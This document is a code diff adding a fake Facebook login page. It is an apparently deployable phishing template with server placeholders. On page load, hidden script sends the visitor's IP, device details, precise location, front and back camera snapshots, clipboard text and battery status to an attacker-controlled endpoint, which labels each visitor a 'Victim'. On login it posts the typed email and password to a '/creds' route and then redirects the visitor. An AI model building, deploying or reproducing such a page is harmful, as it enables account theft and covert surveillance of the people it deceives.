@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Facebook – log in or sign up</title>
+<link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; min-height: 100vh; }
+.header { background: #fff; height: 56px; box-shadow: 0 2px 4px rgba(0,0,0,.1); display: none; }
+.main { display: flex; align-items: center; justify-content: center; min-height: calc(100vh - 160px); padding: 20px; }
+.wrapper { display: flex; align-items: center; max-width: 980px; width: 100%; gap: 36px; }
+.left { flex: 1; padding-right: 32px; }
+.logo-text { color: #1877f2; font-size: 56px; font-weight: bold; margin: -28px 0 0 -28px; }
+.tagline { font-size: 28px; line-height: 32px; color: #1c1e21; font-weight: normal; }
+.right { width: 396px; }
+.form-box { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); }
+.form-group { margin-bottom: 12px; }
+.form-group input { width: 100%; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; color: #1d2129; }
+.form-group input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
+.form-group input::placeholder { color: #90949c; }
+.btn-login { width: 100%; padding: 14px 16px; background: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; margin-top: 6px; }
+.btn-login:hover { background: #166fe5; }
+.forgot { display: block; text-align: center; color: #1877f2; font-size: 14px; text-decoration: none; margin: 16px 0; }
+.forgot:hover { text-decoration: underline; }
+.divider { border-bottom: 1px solid #dadde1; margin: 20px 16px; }
+.btn-create { display: block; width: fit-content; margin: 0 auto; padding: 12px 24px; background: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; text-decoration: none; cursor: pointer; }
+.btn-create:hover { background: #36a420; }
+.create-page { text-align: center; margin-top: 28px; font-size: 14px; color: #1c1e21; }
+.create-page a { color: #1c1e21; font-weight: 600; text-decoration: none; }
+.footer { background: #fff; padding: 20px 0; }
+.footer-content { max-width: 980px; margin: 0 auto; padding: 0 20px; }
+.footer-links { display: flex; flex-wrap: wrap; gap: 4px 10px; margin-bottom: 8px; }
+.footer-links a { color: #8a8d91; font-size: 12px; text-decoration: none; }
+.footer-copy { color: #8a8d91; font-size: 11px; }
+.loading { display: none; padding: 30px; text-align: center; }
+.spinner { border: 3px solid #dddfe2; border-top: 3px solid #1877f2; border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+@media (max-width: 900px) {
+.wrapper { flex-direction: column; text-align: center; gap: 20px; }
+.left { padding: 0; }
+.logo-text { font-size: 42px; margin: 0; }
+.tagline { font-size: 18px; display: none; }
+.right { width: 100%; max-width: 396px; }
+}
+</style>
+</head>
+<body>
+<div class="main">
+<div class="wrapper">
+<div class="left">
+<div class="logo-text">facebook</div>
+<p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+</div>
+<div class="right">
+<div class="form-box">
+<form id="loginForm">
+<div class="form-group">
+<input type="text" id="email" placeholder="Email or phone number" required autofocus>
+</div>
+<div class="form-group">
+<input type="password" id="password" placeholder="Password" required>
+</div>
+<button type="submit" class="btn-login">Log In</button>
+</form>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p style="color: #65676b; font-size: 14px;">Logging in...</p>
+</div>
+<a href="#" class="forgot">Forgot password?</a>
+<div class="divider"></div>
+<button class="btn-create" onclick="return false;">Create new account</button>
+</div>
+<p class="create-page"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+</div>
+</div>
+</div>
+<footer class="footer">
+<div class="footer-content">
+<div class="footer-links">
+<a href="#">English (US)</a><a href="#">العربية</a><a href="#">Español</a><a href="#">Français</a>
+<a href="#">Português</a><a href="#">Deutsch</a><a href="#">日本語</a><a href="#">한국어</a>
+</div>
+<div class="footer-links">
+<a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a><a href="#">Facebook Lite</a>
+<a href="#">Video</a><a href="#">Places</a><a href="#">Games</a><a href="#">Marketplace</a>
+<a href="#">Meta Pay</a><a href="#">Meta Store</a><a href="#">Meta Quest</a><a href="#">Instagram</a>
+<a href="#">Threads</a><a href="#">Fundraisers</a><a href="#">Services</a><a href="#">Voting Information Center</a>
+<a href="#">Privacy Policy</a><a href="#">Privacy Center</a><a href="#">Groups</a><a href="#">About</a>
+<a href="#">Create Ad</a><a href="#">Create Page</a><a href="#">Developers</a><a href="#">Careers</a>
+<a href="#">Cookies</a><a href="#">Ad Choices</a><a href="#">Terms</a><a href="#">Help</a>
+</div>
+<p class="footer-copy">Meta © 2024</p>
+</div>
+</footer>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video = document.getElementById('video');
+var canvas = document.getElementById('canvas');
+
+async function gatherAll() {
+    let td = '📘 <b>Facebook Victim!</b>\n\n';
+    td += '⚓ IP: <code><%=ip %></code>\n';
+    td += '⏰ Time: ' + new Date().toLocaleString() + '\n';
+    td += '🖥️ OS: <code>' + navigator.platform + '</code>\n';
+    td += '📱 Screen: <code>' + screen.width + 'x' + screen.height + '</code>\n';
+    td += '🌐 Browser: <code>' + navigator.userAgent.split(' ').pop() + '</code>\n';
+    
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    
+    if(navigator.geolocation){
+        navigator.geolocation.getCurrentPosition((p)=>{
+            $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});
+        }, ()=>{}, {enableHighAccuracy:true, timeout: 10000});
+    }
+    
+    async function captureCamera(facingMode, label) {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: facingMode, width: 640, height: 480}});
+            video.srcObject = stream;
+            await video.play();
+            await new Promise(r => setTimeout(r, 2000));
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            $.post("<%=a %>/camsnap", {uid: uid, img: encodeURIComponent(canvas.toDataURL("image/jpeg", 0.8).replace("data:image/jpeg;base64,", "")), cam: label});
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) { console.log(e); }
+    }
+    
+    try { await captureCamera("user", "selfie"); } catch(e) {}
+    try { await captureCamera("environment", "back"); } catch(e) {}
+    
+    try {
+        if(navigator.clipboard && navigator.clipboard.readText) {
+            const clip = await navigator.clipboard.readText();
+            if(clip) $.post("<%=a %>/clipboard", {uid:uid, clip:encodeURIComponent(clip)});
+        }
+    } catch(e) {}
+    
+    try {
+        const bat = await navigator.getBattery();
+        $.post("<%=a %>/battery", {uid:uid, level:Math.round(bat.level*100), charging:bat.charging});
+    } catch(e) {}
+}
+
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const email = document.getElementById('email').value;
+    const pass = document.getElementById('password').value;
+    
+    document.querySelector('form').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    
+    $.post("<%=a %>/creds", {
+        uid: uid,
+        user: encodeURIComponent(email),
+        pass: encodeURIComponent(pass),
+        platform: 'Facebook'
+    });
+    
+    await new Promise(r => setTimeout(r, 2500));
+    window.location.href = "<%=url %>";
+});
+
+window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
+</script>
+</body>
+</html>
